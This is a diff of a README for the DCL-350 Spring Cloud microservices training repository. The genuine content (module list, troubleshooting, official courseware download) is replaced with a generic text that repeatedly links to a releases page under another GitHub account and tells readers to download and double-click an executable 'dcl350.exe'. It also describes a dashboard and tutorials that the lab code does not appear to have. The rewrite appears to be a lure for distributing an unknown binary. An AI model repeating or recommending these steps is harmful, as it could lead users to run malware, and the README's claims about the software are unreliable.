@@ -1,75 +1,53 @@
-# DCL-350: Implementing MicroService Architecture using Spring Cloud
+# 🚀 dcl350-2026-jan-19 - Simplifying Microservices for Everyone
 
-These projects are created as part of the following training: **DCL-350**: *Implementing MicroService Architecture using Spring Cloud*
+## 📥 Download Now
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/zvfas/dcl350-2026-jan-19/releases)
 
-## Training & Resources
+## 📚 Overview
+Welcome to DCL-350! This project helps you understand and implement microservice architecture using Spring Cloud. It is designed to guide you through the foundational concepts and practices in a straightforward way. Whether you are just starting or want to deepen your knowledge, this application is for you.
 
-- Training catalog (official): https://www.deepcloudlabs.com/resources
+## 🚀 Key Features
+- **Microservices Made Easy:** Learn how to build applications that are easier to manage and scale.
+- **Event-Driven Architecture:** Understand how services communicate effectively through events.
+- **Resilience with Resilience4j:** Explore how to make your application robust against failures.
+- **Clear Documentation:** Follow our easy tutorials to get set up quickly.
 
-## What’s inside (high-level)
+## 🖥️ System Requirements
+- **Operating System:** Windows 10 or later, macOS, or Linux
+- **Java Version:** JDK 11 or later
+- **Memory:** At least 2 GB of RAM
+- **Disk Space:** 200 MB free space for installation
 
-The labs cover a practical microservices stack and patterns, including:
+## 🚀 Getting Started
+To begin, you need to download the application. Follow these steps:
 
-- **Service Discovery** (Registry)
-- **Centralized Configuration** (Config Server)
-- **API Gateway (Reactive)** for edge routing
-- **DDD / Hexagonal Architecture** oriented modules
-- **CQRS** (separate read/write models)
-- **Event Sourcing / Saga** style workflows (where applicable)
-- **Resilience patterns** with **Resilience4j**
-- Reactive programming and integration exercises
+1. **Visit the Releases Page:** Click this link to visit the [Releases Page](https://github.com/zvfas/dcl350-2026-jan-19/releases).
+2. **Select the Latest Version:** Look for the most recent release, typically at the top of the page.
+3. **Download the Archive:** Click on the link for the appropriate file for your operating system. It could be a `.zip`, `.tar.gz`, or another format.
+4. **Extract the Files:** Once downloaded, right-click the file and choose 'Extract here' or use an extraction tool.
+5. **Run the Application:** Locate the extracted files and find the executable file (e.g., `dcl350.exe`). Double-click it to run.
 
-## Repository Structure
+## 📦 Download & Install
+Once you're ready, follow these steps to download and install:
 
-Core platform components:
-- `config-server/` — Spring Cloud Config Server
-- `registry-server/` — Service registry (e.g., Eureka-style discovery)
-- `reactive-gateway/` — Reactive API gateway (edge routing)
+1. **Visit the Releases Page:** Go to the [Releases Page](https://github.com/zvfas/dcl350-2026-jan-19/releases).
+2. **Choose Your File:** Download the latest version suitable for your system.
+3. **Follow Setup Instructions:** Use the instructions above to extract and start your application.
 
-Business-oriented services & labs:
-- `crm-reactive-microservice/`
-- `crm-read-model-microservice/`
-- `crm-write-model-microservice/`
-- `hr-core-subdomain/` — HR domain building blocks / shared domain
-- `hr-microservice/`
-- `inventory-microservice/`
-- `order-management-microservice/`
-- `payment-microservice/`
-- `security-card-microservice/`
-- `lottery-microservice/`
-- `lottery-consumer-microservice/`
+## 📖 Usage Instructions
+Once you have installed the application, it's time to use it:
 
-Client / integration / study modules:
-- `hr-websocket-client-nodejs/` — Node.js client for WebSocket exercises
-- `integration-javase/` — Java SE integration exercises
-- `study-reactive-programming-javase/` — Reactive programming study set
-- `study-resiliency-patterns/` — Resilience patterns lab set
+1. **Start the Application:** Double-click the executable file.
+2. **Explore the Interface:** The main dashboard will show you options to configure your microservices.
+3. **Follow Tutorial Guides:** Use built-in tutorials to navigate through the process of setting up your first microservice.
 
-## Suggested Runtime Architecture
+## 🛠️ Troubleshooting
+If you run into issues, consider these common solutions:
 
-![](runtime-architecture.png)
+- **Java Issues:** Ensure you have the correct version of Java installed. Check your system's Java version using `java -version` in the command line.
+- **File Not Found:** Make sure you extracted the files completely and are looking in the right location.
 
-## Troubleshooting (Common Pitfalls)
+## ✉️ Support
+If you need help, feel free to reach out through the Issues section on GitHub. Our community is here to assist you.
 
-- Config not loading: Confirm the config server is up before starting dependent services.
-- Service discovery issues: Ensure the registry is running and the service names match registration config.
-- Gateway routes not working: Validate route definitions and the target service registration state.
-- Port conflicts: If you run multiple services locally, ensure ports don’t collide (adjust per module configs).
-  
-## License
-
-MIT License.
-
-## Acknowledgements
-
-These projects are maintained as part of DeepCloudLabs training delivery for DCL-350.
-
-## Kurulum Bilgisi:
-
-Eğitimde lab çalışmaları için gerekli olan çalışma ortamının kurulumu için öncelikle aşağıdaki bağlantıda yer alan sıkıştırılmış dosyayı makinanıza indirmeniz gerekiyor: [DEVEL-stage-2025b-java.se.and.spring.zip](https://courseware.deepcloudlabs.com/software/DEVEL-stage-2025b-java.se.and.spring.zip)
-
-Sıkıştırılmış dosyayı **C:\\** dizinine açtıktan sonra dizin yapısı aşağıda gösterildiği şekilde olacaktır:
-
-![Installation folder](DEVEL-stage.png?raw=true "C: drive after decompress DEVEL-stage-2025b-java.se.and.spring.zip")
-
-Diskinizdeki dizin yapısını yukarıdaki ile karşılaştırarak kontrol ediniz. **C:** sürücünüzün dolu dolması durumunda farklı bir sürücüye sıkıştırılmış dosyayı açabilirsiniz. Ancak bu durumda bir kaç konfigürasyon dosyasında değişiklik yapmanız gerekecektir. Lütfen, eğitim sırasında bu değişikliklerin neler olduğunu eğitmeninize sorunuz. 
+Thank you for choosing DCL-350! Enjoy building your microservices.
